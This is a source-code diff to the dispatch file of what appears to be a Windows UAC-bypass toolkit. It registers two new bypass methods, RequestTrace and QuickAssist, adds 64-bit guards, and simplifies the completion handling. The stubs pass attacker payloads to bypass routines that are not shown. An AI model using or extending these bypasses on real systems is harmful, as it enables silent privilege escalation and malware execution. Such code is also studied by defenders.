@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2024
+*  (C) COPYRIGHT AUTHORS, 2015 - 2025
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.66
+*  VERSION:     3.69
 *
-*  DATE:        21 Jul 2024
+*  DATE:        07 Jul 2025
 *
 *  UAC bypass dispatch.
 *
@@ -52,6 +52,8 @@ UCM_API(MethodVFServerDiagProf);
 UCM_API(MethodIscsiCpl);
 UCM_API(MethodAtlHijack);
 UCM_API(MethodSspiDatagram);
+UCM_API(MethodRequestTrace);
+UCM_API(MethodQuickAssist);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -67,7 +69,9 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodVFServerTaskSched,
     UacMethodVFServerDiagProf,
     UacMethodAtlHijack,
-    UacMethodSspiDatagram
+    UacMethodSspiDatagram,
+    UacMethodRequestTrace,
+    UacMethodQuickAssist
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -150,7 +154,9 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
     { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
-    { MethodTokenModUIAccess, { NT_WIN10_19H1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodTokenModUIAccess, { NT_WIN10_19H1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodRequestTrace, { NT_WIN11_24H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -375,14 +381,15 @@ NTSTATUS MethodsManagerCall(
     //
     // Wait a little bit for completion.
     //
-    if (Entry->SetParameters) {
-        if (bParametersBlockSet) {
-            Status = supWaitForGlobalCompletionEvent();
-            ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
-            supDestroySharedParametersBlock(g_ctx);
-        }
+    if (Entry->SetParameters && bParametersBlockSet) {
+        Status = supWaitForGlobalCompletionEvent();
+        ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
+        supDestroySharedParametersBlock(g_ctx);
     }
 
+    //
+    // Perform method-specific cleanup
+    //
     PostCleanupAttempt(Method);
 
     return MethodResult;
@@ -833,15 +840,49 @@ UCM_API(MethodIscsiCpl)
 
 UCM_API(MethodAtlHijack)
 {
+#ifdef _WIN64
     return ucmAtlHijackMethod(MMC_EXE,
         ATL_DLL,
         Parameter->PayloadCode,
         Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
 }
 
 UCM_API(MethodSspiDatagram)
 {
+#ifdef _WIN64
     return ucmSspiDatagramMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
+}
+
+UCM_API(MethodRequestTrace)
+{
+#ifdef _WIN64
+    return ucmRequestTraceMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
+}
+
+UCM_API(MethodQuickAssist)
+{
+#ifdef _WIN64
+    return ucmQuickAssistMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
 }
